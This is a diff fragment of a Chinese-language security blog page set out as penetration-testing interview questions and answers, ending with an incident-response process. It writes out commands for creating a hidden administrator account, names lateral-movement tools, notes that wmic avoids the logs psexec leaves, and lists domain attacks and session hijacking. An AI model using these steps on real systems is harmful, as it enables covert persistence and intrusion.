+<h3 id="四、如何建立隐藏用户？"><a href="#四、如何建立隐藏用户？" class="headerlink" title="四、如何建立隐藏用户？"></a>四、如何建立隐藏用户？</h3><pre class="line-numbers language-none"><code class="language-none">1、net user test$ 123456 /add [建立隐藏用户]
+2、net localgroup administrators test$ /add<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<h3 id="四、正向代理和反向代理的区别？"><a href="#四、正向代理和反向代理的区别？" class="headerlink" title="四、正向代理和反向代理的区别？"></a>四、正向代理和反向代理的区别？</h3><p>正向代理即是客户端代理，代理客户端，服务端不知道实际发起请求的客户端 反向代理即是服务端代理，代理服务端，客户端不知道实际提供服务的服务端</p>
+<p>正向 Shell：攻击者连接被攻击者机器，可用于攻击者处于内网，被攻击者处于公网的情况。 反向 Shell：被攻击者主动连接攻击者，可用于攻击者处于外网，被攻击者处于内网的情况。 正向代理即是客户端代理，代理客户端，服务端不知道实际发起请求的客户端. 反向代理即是服务端代理，代理服务端，客户端不知道实际提供服务的服务端</p>
+<h3 id="四、横向渗透命令执行手段？"><a href="#四、横向渗透命令执行手段？" class="headerlink" title="四、横向渗透命令执行手段？"></a>四、横向渗透命令执行手段？</h3><p>psexec，wmic，smbexec，winrm，net use 共享 + 计划任务 + type 命令</p>
+<p><strong>psexec 和 wmic 或者其他的区别？</strong></p>
+<p>psexec 会记录大量日志，wmic 不会记录下日志。wmic 更为隐蔽</p>
+<h3 id="四、域内攻击方法有了解过吗？"><a href="#四、域内攻击方法有了解过吗？" class="headerlink" title="四、域内攻击方法有了解过吗？"></a>四、域内攻击方法有了解过吗？</h3><p>MS14-068、Roasting 攻击离线爆破密码、委派攻击，非约束性委派、基于资源的约束委派、ntlm relay</p>
+<h3 id="四、桌面有管理员会话，想要做会话劫持怎么做？"><a href="#四、桌面有管理员会话，想要做会话劫持怎么做？" class="headerlink" title="四、桌面有管理员会话，想要做会话劫持怎么做？"></a>四、桌面有管理员会话，想要做会话劫持怎么做？</h3><p>提权到 system 权限，然后去通过工具，就能够劫持任何处于已登录用户的会话，而无需获得该用户的登录凭证。</p>
+<h2 id="二、应急响应的流程"><a href="#二、应急响应的流程" class="headerlink" title="二、应急响应的流程"></a>二、应急响应的流程</h2><p>1.准备阶段：<br>准备阶段要做的是主要是明确资产范围对可能产生安全问题的 地方进行加固。<br>2.检测阶段：<br>通过日常的监控，收集系统信息日志等手段对可疑的迹象进行分析，判断，如果判定他属于网络安全应急响应时间，则对该事件进行上报（可以利用netstat -ano查看端口连接情况，也可以使用tasklist | find “PID” 对具体进程定位。系统日志可以WIN+R，输入eventvw.msc,直接进入事件查看器分析日志）<br>3.抑制阶段：<br>分析影响范围，根据预案采取相应手段，限制攻击的范围，设置隔离区 ，把影响降低到最小（可以使用安全软件进行隔离，如果整台电脑完全沦陷，也可以考虑首先断网）<br>4.根除阶段：<br>分析产生安全事件的原因，如果是木马，，病毒就需要找出源头来并且遏制，如果是入侵行为就可以通过入侵检测的方式来检测数据流，也可以利用一些工具对病毒特征进行扫描分析和定位<br>5.恢复阶段：<br>对受到破坏的系统和信息进行恢复还原，从可信任的备份中恢复还原系统配置，数据库等等，并对其进行实时监控，确保无误的情况可适当去掉之前做的隔离等抑制等措施。<br>6.总结阶段：<br>对我们上面所发生的安全事件做一个总结，对你所使用到的有效的手段和方法做一个记录，对后面可能遇到的安全事件做一个示例。</p>
 
                 
             </div>
@@ -2680,7 +2964,7 @@ new Valine({
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">178.5k</span>&nbsp;字
+                class="white-color">183.3k</span>&nbsp;字
             
             
             
